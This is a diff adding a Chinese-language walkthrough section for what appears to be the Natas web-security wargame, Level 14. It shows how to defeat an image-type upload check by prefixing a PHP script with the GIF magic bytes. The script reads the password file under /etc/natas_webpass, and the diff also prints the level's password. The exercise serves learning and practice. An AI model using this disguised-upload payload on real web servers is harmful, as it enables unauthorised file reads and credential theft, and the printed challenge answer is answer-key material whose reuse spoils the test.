@@ -218,3 +218,27 @@ echo $content;
 
 密码为：`g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
 
+## Level 14
+这次相较 Level 13 的唯一改变是增加了文件类型校验，原理是检查文件的魔数是否为图片类型。
+```php
+...
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
+        echo "File is not an image";
+}
+...
+```
+因此，只需要在构造的脚本最前面加上图片类型魔数即可。这里选择可用 ASCII 字符直接表示的 GIF 类型：
+```php
+GIF87a
+<?php
+$filename = '/etc/natas_webpass/natas14';
+$content = file_get_contents($filename);
+echo $content;
+?>
+```
+
+其余步骤同 Level 13。
+
+密码为 `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`
+
+## Level 15
